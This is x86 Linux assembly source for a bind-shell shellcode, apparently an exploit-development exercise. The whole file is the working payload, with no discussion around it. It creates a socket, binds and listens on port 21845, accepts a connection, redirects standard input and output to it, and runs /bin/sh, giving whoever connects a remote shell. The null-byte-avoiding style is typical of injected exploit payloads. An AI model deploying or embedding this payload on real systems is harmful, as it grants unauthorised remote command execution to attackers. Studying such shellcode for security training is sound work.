global _start

section .text
_start:

	; 359 socket(AF_INET, SOCK_STREAM, 0); 
	; 	or do I need 102 (socketcall) on 32-bit? 
    xor eax, eax
    mov ax, 359         ; 359 = socket
    xor ebx, ebx
    mov bl, 2           ; 2 = AF_INET
    xor ecx, ecx    
    inc ecx             ; 1 = SOCK_STREAM
    xor edx, edx        ; 0
    int 0x80 

    ; store the fd returned in eax
    mov ebx, eax

	; sockaddr struct, built on the stack
    ;	sin_addr.s_addr = htonl(INADDR_ANY)
    xor eax, eax
    push eax            ; IPv4 0.0.0.0
	;	sin_port = htons(SOMEPORT)
    push word 0x5555    ; 21845
	;	sin_family = AF_INET
    push word 2
    mov ecx, esp        ; pointer to our struct

	; 361 bind(fd, sockaddr *, sizeof(sockaddr))
    mov ax, 361         ; 361 = bind
    ; fd set back on line 18
    ; sockaddr * set back on line 31
    xor edx, edx
    mov dl, 16          ; sizeof(sockaddr) = 16
    int 0x80

	; 363 listen(fd, backlog)
    xor eax, eax
    mov ax, 363     ; 363 = listen
    ; fd set in previous syscall
    xor ecx, ecx
    inc ecx         ; backlog of 1
    int 0x80
 
	; 364 accept4(fd, NULL, NULL, 0) --> conn_fd
    xor eax, eax
    mov ax, 364     ; 202 = accept, not supported?
    ; fd set in previous syscall
    xor ecx, ecx    ; addr = NULL
    xor edx, edx    ; addrlen = NULL
    xor esi, esi    ; flags = 0
    int 0x80
    
    ; pass connected fd as first arg of next syscall
    mov ebx, eax

	; 63 dup2(conn_fd, 0-2)
    xor eax, eax
    mov ax, 63      ; 63 = dup2
    ; conn_fd already in ebx from line 55
    ; ecx is already 0 from previous syscall
    int 0x80
    
    mov ax, 63      ; 63 = dup2
    inc ecx         ; STDIN --> STDOUT
    int 0x80

    mov ax, 63      ; 63 = dup2
    inc ecx         ; STDOUT --> STDERR
    int 0x80 

	; 11 execve("/bin/sh", NULL, NULL)
    xor eax, eax
    push eax        ; NULL terminator
    push 0x68732f2f ; "//sh" in reverse
    push 0x6e69622f ; "/bin" in reverse
    mov ax, 11      ; 11 = execve
    mov ebx, esp    ; ptr to "/bin//sh"
    xor ecx, ecx    ; NULL
    xor edx, edx    ; NULL
    int 0x80

    ; clean exit
	xor eax, eax    
    inc al          ; 1 = exit
    xor ebx, ebx    ; 0 = return SUCCESS
    int 0x80
